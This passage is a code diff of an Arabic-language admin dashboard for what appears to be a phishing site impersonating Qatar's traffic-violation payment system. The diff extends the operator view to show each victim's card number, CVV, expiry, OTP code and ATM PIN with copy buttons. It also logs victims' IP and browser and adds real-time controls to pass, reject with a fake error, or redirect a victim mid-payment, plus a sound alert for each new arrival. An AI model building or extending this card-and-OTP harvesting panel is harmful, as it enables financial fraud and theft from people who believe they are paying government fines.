@@ -1,7 +1,18 @@
-import { useState, useEffect, useRef } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { trpc } from "@/lib/trpc";
 
-type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
+type Stage = 
+  | "home"
+  | "inquiry"
+  | "results"
+  | "card"
+  | "card_pending"
+  | "otp"
+  | "otp_pending"
+  | "atm"
+  | "atm_pending"
+  | "success"
+  | "failed";
 
 interface PaymentSession {
   id: number;
@@ -20,7 +31,9 @@ interface PaymentSession {
   errorMessage: string | null;
   plateNumber: string | null;
   plateSource: string | null;
-  plateCode?: string | null;
+  plateCode: string | null;
+  qidNumber: string | null;
+  establishmentId: string | null;
   clientIp: string | null;
   userAgent: string | null;
   statusRead: number | null;
@@ -28,14 +41,17 @@ interface PaymentSession {
   updatedAt: Date | string;
 }
 
-// ======== الحالات ========
+// ======== الحالات المحدثة ========
 const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
-  card:         { label: "جديد",              color: "#2563eb", bg: "#dbeafe" },
-  card_pending: { label: "انتظار دفع",        color: "#d97706", bg: "#fef3c7" },
-  otp:          { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
-  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
-  atm:          { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
-  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
+  home:         { label: "في الرئيسية",       color: "#64748b", bg: "#f1f5f9" },
+  inquiry:      { label: "جاري الاستعلام",    color: "#0891b2", bg: "#ecfeff" },
+  results:      { label: "عرض النتائج",      color: "#0ea5e9", bg: "#f0f9ff" },
+  card:         { label: "إدخال البطاقة",    color: "#2563eb", bg: "#dbeafe" },
+  card_pending: { label: "انتظار الموافقة (بطاقة)", color: "#d97706", bg: "#fef3c7" },
+  otp:          { label: "إدخال OTP",        color: "#b45309", bg: "#fef9c3" },
+  otp_pending:  { label: "انتظار الموافقة (OTP)", color: "#b45309", bg: "#fef9c3" },
+  atm:          { label: "إدخال PIN",        color: "#7c3aed", bg: "#ede9fe" },
+  atm_pending:  { label: "انتظار الموافقة (PIN)", color: "#7c3aed", bg: "#ede9fe" },
   success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
   failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
 };
@@ -44,7 +60,7 @@ function StageBadge({ stage }: { stage: Stage }) {
   const cfg = stageConfig[stage] || { label: stage, color: "#6b7280", bg: "#f3f4f6" };
   return (
     <span
-      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold"
+      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-[10px] font-bold"
       style={{ color: cfg.color, backgroundColor: cfg.bg }}
     >
       {cfg.label}
@@ -77,16 +93,16 @@ function BookingDetailModal({
 
   const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
     <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
-      <span className="text-gray-500 text-sm">{label}</span>
-      <span className="text-gray-800 text-sm font-medium text-left">{value || "-"}</span>
+      <span className="text-gray-500 text-xs">{label}</span>
+      <span className="text-gray-800 text-xs font-medium text-left">{value || "-"}</span>
     </div>
   );
 
   const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
     <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
-      <span className="text-gray-500 text-sm">{label}</span>
+      <span className="text-gray-500 text-xs">{label}</span>
       <div className="flex items-center gap-2">
-        <span className="text-gray-800 text-sm font-mono font-semibold">{value || "-"}</span>
+        <span className="text-gray-800 text-sm font-mono font-bold">{value || "-"}</span>
         {value && (
           <button
             onClick={() => copyText(value)}
@@ -99,7 +115,7 @@ function BookingDetailModal({
               </svg>
             ) : (
               <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m-7 4h9m-9 4h9m-9 4h9" />
               </svg>
             )}
           </button>
@@ -109,133 +125,103 @@ function BookingDetailModal({
   );
 
   return (
-    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4" onClick={onClose}>
-      <div
-        className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto shadow-2xl"
-        onClick={e => e.stopPropagation()}
-        dir="rtl"
-      >
-        <div className="flex items-center justify-between p-5 border-b border-gray-200">
-          <h3 className="text-gray-800 font-bold text-base">
-            تفاصيل الحجز - <span className="text-blue-600 font-mono text-sm">{session.sessionId.slice(0, 16)}</span>
-          </h3>
-          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition">
-            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+    <div className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4 backdrop-blur-sm overflow-y-auto">
+      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg my-8">
+        <div className="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50 rounded-t-2xl">
+          <div>
+            <h3 className="text-gray-800 font-bold text-lg">تفاصيل العملية</h3>
+            <p className="text-gray-400 text-[10px] mt-0.5 font-mono">{session.sessionId}</p>
+          </div>
+          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 p-2 hover:bg-gray-200 rounded-full transition">
+            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
             </svg>
           </button>
         </div>
 
-        <div className="p-5 space-y-5">
-          <div>
-            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
-              <svg className="w-4 h-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-              </svg>
-              بيانات العميل
+        <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
+          {/* بيانات الاستعلام */}
+          <section>
+            <h4 className="text-blue-600 font-bold text-xs mb-3 flex items-center gap-2">
+              <span className="w-1 h-4 bg-blue-600 rounded-full"></span>
+              بيانات الاستعلام
             </h4>
-            <div className="bg-gray-50 rounded-xl px-4">
-              <InfoRow label="الاسم" value={session.cardName || "غير محدد"} />
+            <div className="bg-gray-50 rounded-xl p-4 space-y-1">
               <InfoRow label="رقم اللوحة" value={session.plateNumber} />
-              <InfoRow label="جهة الإصدار" value={session.plateSource} />
-              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} ر.ق` : null} />
-              <InfoRow label="IP العميل" value={session.clientIp} />
-              <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
+              <InfoRow label="نوع اللوحة" value={session.plateCode} />
+              <InfoRow label="المصدر" value={session.plateSource} />
+              <InfoRow label="الرقم الشخصي" value={session.qidNumber} />
+              <InfoRow label="قيد المنشأة" value={session.establishmentId} />
+              <InfoRow label="إجمالي المخالفات" value={session.totalAmount ? `${session.totalAmount} ر.ق` : "-"} />
             </div>
-          </div>
+          </section>
 
-          {session.cardNumber && (
-            <div>
-              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
-                <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
-                </svg>
-                بيانات البطاقة
-              </h4>
-              <div className="bg-gray-50 rounded-xl px-4">
-                <CopyRow label="اسم الحامل" value={session.cardName} />
-                <CopyRow label="رقم البطاقة" value={session.cardNumber} />
-                <CopyRow label="تاريخ الانتهاء" value={session.cardExpiry} />
+          {/* بيانات البطاقة */}
+          <section>
+            <h4 className="text-purple-600 font-bold text-xs mb-3 flex items-center gap-2">
+              <span className="w-1 h-4 bg-purple-600 rounded-full"></span>
+              بيانات الدفع
+            </h4>
+            <div className="bg-gray-50 rounded-xl p-4 space-y-1">
+              <InfoRow label="الاسم على البطاقة" value={session.cardName} />
+              <CopyRow label="رقم البطاقة" value={session.cardNumber} />
+              <div className="grid grid-cols-2 gap-4">
+                <CopyRow label="التاريخ" value={session.cardExpiry} />
                 <CopyRow label="CVV" value={session.cardCvv} />
               </div>
+              <CopyRow label="رمز OTP" value={session.otpCode} />
+              <CopyRow label="رقم ATM PIN" value={session.atmPin} />
             </div>
-          )}
+          </section>
 
-          {session.otpCode && (
-            <div>
-              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
-                <svg className="w-4 h-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-                </svg>
-                رمز OTP
-              </h4>
-              <div className="bg-gray-50 rounded-xl px-4">
-                <CopyRow label="رمز OTP" value={session.otpCode} />
+          {/* معلومات تقنية */}
+          <section>
+            <h4 className="text-gray-500 font-bold text-xs mb-3 flex items-center gap-2">
+              <span className="w-1 h-4 bg-gray-500 rounded-full"></span>
+              معلومات إضافية
+            </h4>
+            <div className="bg-gray-50 rounded-xl p-4 space-y-1 text-[10px]">
+              <InfoRow label="عنوان IP" value={session.clientIp} />
+              <InfoRow label="تاريخ الدخول" value={new Date(session.createdAt).toLocaleString("ar-QA")} />
+              <div className="py-2">
+                <span className="text-gray-500 block mb-1">المتصفح:</span>
+                <span className="text-gray-400 break-all leading-tight">{session.userAgent}</span>
               </div>
             </div>
-          )}
+          </section>
 
-          {session.atmPin && (
-            <div>
-              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
-                <svg className="w-4 h-4 text-amber-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
-                </svg>
-                الرقم السري (PIN)
-              </h4>
-              <div className="bg-gray-50 rounded-xl px-4">
-                <CopyRow label="PIN" value={session.atmPin} />
-              </div>
+          {/* الإجراءات */}
+          <div className="pt-4 border-t border-gray-100">
+            <div className="mb-4">
+              <label className="text-gray-500 text-xs block mb-2">رسالة الخطأ (عند الرفض)</label>
+              <input
+                type="text"
+                value={customError}
+                onChange={e => setCustomError(e.target.value)}
+                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
+              />
             </div>
-          )}
-
-          {isPending && (
-            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
-              <h4 className="text-amber-700 font-bold text-sm mb-3">⚡ الإجراءات</h4>
-              <div className="flex flex-wrap gap-2 mb-3">
-                <button
-                  onClick={() => onAction("pass")}
-                  className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
-                >
-                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-                  </svg>
-                  قبول / التالي
-                </button>
-                <button
-                  onClick={() => onAction("denied", customError)}
-                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
-                >
-                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                  </svg>
-                  رفض
-                </button>
-                <button
-                  onClick={() => onAction("completed")}
-                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
-                >
-                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-                  </svg>
-                  إتمام الدفع
-                </button>
-              </div>
-              <div>
-                <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
-                <input
-                  type="text"
-                  value={customError}
-                  onChange={e => setCustomError(e.target.value)}
-                  className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white"
-                />
-              </div>
+            
+            <div className="grid grid-cols-3 gap-3">
+              <button
+                onClick={() => onAction("pass")}
+                className="bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
+              >
+                تمرير (التالي)
+              </button>
+              <button
+                onClick={() => onAction("denied", customError)}
+                className="bg-red-500 hover:bg-red-600 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
+              >
+                رفض (خطأ)
+              </button>
+              <button
+                onClick={() => onAction("completed")}
+                className="bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl font-bold text-sm shadow-md transition"
+              >
+                إتمام العملية
+              </button>
             </div>
-          )}
-
-          <div className="bg-gray-50 rounded-xl px-4">
-            <InfoRow label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString("ar-QA")} />
-            <InfoRow label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString("ar-QA")} />
           </div>
         </div>
       </div>
@@ -243,10 +229,9 @@ function BookingDetailModal({
   );
 }
 
-// ======== الصفحة الرئيسية ========
 export default function AdminPanel() {
-  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
   const [password, setPassword] = useState("");
+  const [token, setToken] = useState<string | null>(localStorage.getItem("adminToken"));
   const [showPassword, setShowPassword] = useState(false);
   const [loginError, setLoginError] = useState("");
   const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
@@ -257,6 +242,7 @@ export default function AdminPanel() {
   const [redirectUrl, setRedirectUrl] = useState("");
   const [activeVisitors, setActiveVisitors] = useState(0);
   const wsRef = useRef<WebSocket | null>(null);
+  const lastSessionCount = useRef(0);
 
   // WebSocket لتتبع الزوار الحقيقيين
   useEffect(() => {
@@ -296,14 +282,26 @@ export default function AdminPanel() {
   );
   const sessionsQuery = trpc.admin.getSessions.useQuery(
     { token: token || "" },
-    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 5000 }
+    { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 3000 }
   );
   const sessionDetailQuery = trpc.admin.getSession.useQuery(
     { token: token || "", sessionId: selectedSession?.sessionId || "" },
-    { enabled: !!token && !!selectedSession, refetchInterval: 3000 }
+    { enabled: !!token && !!selectedSession, refetchInterval: 2000 }
   );
   const actionMutation = trpc.admin.action.useMutation();
   const redirectMutation = trpc.admin.redirect.useMutation();
+
+  // إشعار عند دخول عميل جديد
+  useEffect(() => {
+    if (sessionsQuery.data && sessionsQuery.data.length > lastSessionCount.current) {
+      if (lastSessionCount.current > 0) {
+        showNotif("دخل عميل جديد الآن!", "info");
+        // يمكن إضافة صوت هنا
+        try { new Audio("/notification.mp3").play(); } catch {}
+      }
+      lastSessionCount.current = sessionsQuery.data.length;
+    }
+  }, [sessionsQuery.data]);
 
   useEffect(() => {
     if (verifyQuery.data && !verifyQuery.data.valid) {
@@ -335,19 +333,32 @@ export default function AdminPanel() {
   const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
     if (!selectedSession || !token) return;
     try {
-      const res = await actionMutation.mutateAsync({
+      await actionMutation.mutateAsync({
         token,
         sessionId: selectedSession.sessionId,
         action,
         errorMessage: errorMsg,
       });
-      showNotif(
-        `تم تنفيذ الإجراء بنجاح`,
-        "success"
-      );
+      showNotif(`تم تنفيذ الإجراء بنجاح`, "success");
       setSelectedSession(null);
       sessionsQuery.refetch();
       statsQuery.refetch();
+    } catch (err: any) {
+      showNotif(err.message || "حدث خطأ", "error");
+    }
+  };
+
+  const handleRedirect = async () => {
+    if (!redirectSession || !token || !redirectUrl) return;
+    try {
+      await redirectMutation.mutateAsync({
+        token,
+        sessionId: redirectSession.sessionId,
+        redirectUrl,
+      });
+      showNotif("تم توجيه العميل بنجاح", "success");
+      setRedirectSession(null);
+      setRedirectUrl("");
     } catch (err: any) {
       showNotif(err.message || "حدث خطأ", "error");
     }
@@ -378,6 +389,22 @@ export default function AdminPanel() {
                   placeholder="أدخل كلمة المرور"
                   className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100"
                 />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute left-3 top-3 text-gray-400 hover:text-gray-600"
+                >
+                  {showPassword ? (
+                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />
+                    </svg>
+                  ) : (
+                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                    </svg>
+                  )}
+                </button>
               </div>
             </div>
 
@@ -410,7 +437,7 @@ export default function AdminPanel() {
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {notification && (
-        <div className={`fixed top-4 right-4 z-[100] rounded-xl px-4 py-3 shadow-lg text-white text-sm font-medium ${notification.type === "success" ? "bg-green-600" : "bg-red-600"}`}>
+        <div className={`fixed top-4 right-4 z-[100] rounded-xl px-4 py-3 shadow-lg text-white text-sm font-medium animate-bounce ${notification.type === "success" ? "bg-green-600" : notification.type === "info" ? "bg-blue-600" : "bg-red-600"}`}>
           {notification.message}
         </div>
       )}
@@ -425,7 +452,7 @@ export default function AdminPanel() {
       )}
 
       {redirectSession && token && (
-        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
+        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
           <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
             <h3 className="text-gray-800 font-bold text-base mb-4">توجيه العميل</h3>
             <div className="space-y-4">
@@ -434,7 +461,7 @@ export default function AdminPanel() {
                   <button
                     key={page.url}
                     onClick={() => setRedirectUrl(page.url)}
-                    className={`px-3 py-2 rounded-lg text-sm border ${redirectUrl === page.url ? "bg-purple-600 text-white" : "bg-gray-50"}`}
+                    className={`px-3 py-2 rounded-lg text-sm border transition ${redirectUrl === page.url ? "bg-blue-600 text-white border-blue-600" : "bg-gray-50 border-gray-200 text-gray-600"}`}
                   >
                     {page.label}
                   </button>
@@ -445,102 +472,139 @@ export default function AdminPanel() {
                 value={redirectUrl}
                 onChange={e => setRedirectUrl(e.target.value)}
                 placeholder="رابط مخصص..."
-                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm"
+                className="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
               />
               <div className="flex gap-2">
-                <button
-                  onClick={async () => {
-                    await redirectMutation.mutateAsync({ token, sessionId: redirectSession.sessionId, redirectUrl });
-                    showNotif("تم التوجيه", "success");
-                    setRedirectSession(null);
-                  }}
-                  className="flex-1 bg-purple-600 text-white py-2 rounded-xl font-bold"
-                >
-                  توجيه
-                </button>
-                <button onClick={() => setRedirectSession(null)} className="px-4 py-2 bg-gray-100 rounded-xl">إلغاء</button>
+                <button onClick={handleRedirect} className="flex-1 bg-blue-600 text-white py-2 rounded-lg font-bold text-sm shadow-md">توجيه الآن</button>
+                <button onClick={() => setRedirectSession(null)} className="flex-1 bg-gray-100 text-gray-600 py-2 rounded-lg font-bold text-sm">إلغاء</button>
               </div>
             </div>
           </div>
         </div>
       )}
 
-      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
-        <div className="flex items-center gap-3">
-          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white">
-            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-            </svg>
+      {/* Header */}
+      <nav className="bg-white border-b border-gray-200 px-6 py-4 sticky top-0 z-40 shadow-sm">
+        <div className="max-w-7xl mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg text-white">
+              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+              </svg>
+            </div>
+            <div>
+              <h1 className="text-gray-800 font-bold text-lg leading-tight">نظام مخالفات قطر</h1>
+              <p className="text-gray-400 text-[10px] font-medium uppercase tracking-wider">لوحة التحكم</p>
+            </div>
           </div>
-          <div>
-            <h1 className="text-gray-800 font-bold text-sm">نظام مخالفات قطر</h1>
-            <p className="text-blue-600 text-xs font-semibold">لوحة التحكم</p>
-          </div>
-        </div>
-        <div className="flex items-center gap-3">
-          <span className="text-green-600 text-xs font-medium">● متصل</span>
-          <button onClick={handleLogout} className="bg-red-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">خروج</button>
-        </div>
-      </header>
 
-      <div className="p-6">
-        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
+          <div className="flex items-center gap-4">
+            <div className="flex items-center gap-2 bg-green-50 px-3 py-1.5 rounded-full border border-green-100">
+              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+              <span className="text-green-700 text-xs font-bold">متصل</span>
+            </div>
+            <button onClick={handleLogout} className="bg-red-50 text-red-600 px-4 py-2 rounded-xl text-sm font-bold hover:bg-red-100 transition border border-red-100">خروج</button>
+          </div>
+        </div>
+      </nav>
+
+      <main className="max-w-7xl mx-auto px-6 py-8">
+        {/* Stats Grid */}
+        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
           {[
-            { label: "إجمالي العمليات", value: statsQuery.data?.total || 0, color: "text-blue-600", bg: "bg-blue-50" },
-            { label: "عمليات جديدة", value: statsQuery.data?.new || 0, color: "text-orange-600", bg: "bg-orange-50" },
-            { label: "مكتملة", value: statsQuery.data?.completed || 0, color: "text-green-600", bg: "bg-green-50" },
-            { label: "قيد المعالجة", value: statsQuery.data?.pending || 0, color: "text-yellow-600", bg: "bg-yellow-50" },
-            { label: "زوار متصلون", value: activeVisitors, color: "text-purple-600", bg: "bg-purple-50" },
-          ].map((stat, i) => (
-            <div key={i} className="bg-white rounded-xl p-4 border border-gray-100 shadow-sm">
-              <div className={`text-2xl font-bold ${stat.color}`}>{stat.value}</div>
-              <div className="text-gray-500 text-xs">{stat.label}</div>
+            { label: "إجمالي العمليات", val: statsQuery.data?.total || 0, color: "text-blue-600", bg: "bg-blue-50" },
+            { label: "عمليات جديدة", val: statsQuery.data?.new || 0, color: "text-amber-600", bg: "bg-amber-50" },
+            { label: "مكتملة", val: statsQuery.data?.completed || 0, color: "text-green-600", bg: "bg-green-50" },
+            { label: "قيد المعالجة", val: statsQuery.data?.pending || 0, color: "text-purple-600", bg: "bg-purple-50" },
+            { label: "زوار متصلون", val: activeVisitors, color: "text-cyan-600", bg: "bg-cyan-50" },
+          ].map((s, i) => (
+            <div key={i} className="bg-white p-5 rounded-2xl shadow-sm border border-gray-100 transition hover:shadow-md">
+              <p className="text-gray-400 text-[10px] font-bold mb-1 uppercase tracking-wider">{s.label}</p>
+              <p className={`text-2xl font-black ${s.color}`}>{s.val}</p>
             </div>
           ))}
         </div>
 
-        <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
-          <div className="p-4 border-b border-gray-100 flex justify-between items-center">
-            <h2 className="font-bold">قائمة العمليات</h2>
-            <input
-              type="text"
-              placeholder="بحث..."
-              value={searchQuery}
-              onChange={e => setSearchQuery(e.target.value)}
-              className="border rounded-lg px-3 py-1.5 text-sm w-48"
-            />
+        {/* Search & List */}
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
+          <div className="p-6 border-b border-gray-100 bg-gray-50/50 flex flex-col md:flex-row justify-between items-center gap-4">
+            <h2 className="text-gray-800 font-bold text-base">قائمة العمليات اللحظية</h2>
+            <div className="relative w-full md:w-72">
+              <input
+                type="text"
+                placeholder="بحث برقم اللوحة أو IP..."
+                value={searchQuery}
+                onChange={e => setSearchQuery(e.target.value)}
+                className="w-full border border-gray-200 rounded-xl px-4 py-2.5 pr-10 text-sm focus:outline-none focus:border-blue-500 bg-white"
+              />
+              <svg className="w-4 h-4 text-gray-400 absolute left-3 top-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+              </svg>
+            </div>
           </div>
+
           <div className="overflow-x-auto">
-            <table className="w-full text-sm text-right">
-              <thead className="bg-gray-50">
-                <tr>
-                  <th className="p-3">المبلغ</th>
-                  <th className="p-3">رقم اللوحة</th>
-                  <th className="p-3">المصدر</th>
-                  <th className="p-3">الحالة</th>
-                  <th className="p-3">التاريخ</th>
-                  <th className="p-3">الإجراءات</th>
+            <table className="w-full text-right">
+              <thead>
+                <tr className="bg-gray-50 text-gray-400 text-[10px] font-bold uppercase tracking-wider border-b border-gray-100">
+                  <th className="px-6 py-4">المبلغ</th>
+                  <th className="px-6 py-4">رقم اللوحة / الهوية</th>
+                  <th className="px-6 py-4">النوع</th>
+                  <th className="px-6 py-4">الحالة (الموقع)</th>
+                  <th className="px-6 py-4">التاريخ</th>
+                  <th className="px-6 py-4">الإجراءات</th>
                 </tr>
               </thead>
-              <tbody>
-                {filteredSessions.map(s => (
-                  <tr key={s.sessionId} className="border-b hover:bg-gray-50">
-                    <td className="p-3 font-bold text-blue-600">{s.totalAmount} ر.ق</td>
-                    <td className="p-3 font-mono">{s.plateNumber}</td>
-                    <td className="p-3">{s.plateSource}</td>
-                    <td className="p-3"><StageBadge stage={s.stage} /></td>
-                    <td className="p-3 text-gray-500 text-xs">{new Date(s.createdAt).toLocaleString("ar-QA")}</td>
-                    <td className="p-3 flex gap-2">
-                      <button onClick={() => setSelectedSession(s)} className="bg-blue-600 text-white px-3 py-1 rounded-lg text-xs">تفاصيل</button>
-                      <button onClick={() => { setRedirectSession(s); setRedirectUrl(""); }} className="bg-purple-100 text-purple-700 px-3 py-1 rounded-lg text-xs">توجيه</button>
+              <tbody className="divide-y divide-gray-100">
+                {filteredSessions.map((s) => (
+                  <tr key={s.id} className={`hover:bg-gray-50 transition ${s.statusRead === 0 ? "bg-blue-50/30" : ""}`}>
+                    <td className="px-6 py-4">
+                      <span className="text-gray-900 font-black text-sm">{s.totalAmount || "0.00"}</span>
+                      <span className="text-gray-400 text-[10px] mr-1">ر.ق</span>
+                    </td>
+                    <td className="px-6 py-4">
+                      <div className="flex flex-col">
+                        <span className="text-gray-800 font-bold text-sm">{s.plateNumber || s.qidNumber || s.establishmentId || "-"}</span>
+                        <span className="text-gray-400 text-[10px]">{s.plateSource || "قطر"}</span>
+                      </div>
+                    </td>
+                    <td className="px-6 py-4">
+                      <span className="text-gray-500 text-xs">{s.plateCode || (s.qidNumber ? "رقم شخصي" : s.establishmentId ? "قيد منشأة" : "-")}</span>
+                    </td>
+                    <td className="px-6 py-4">
+                      <StageBadge stage={s.stage} />
+                    </td>
+                    <td className="px-6 py-4 text-gray-400 text-xs">
+                      {new Date(s.createdAt).toLocaleTimeString("ar-QA", { hour: '2-digit', minute: '2-digit' })}
+                    </td>
+                    <td className="px-6 py-4">
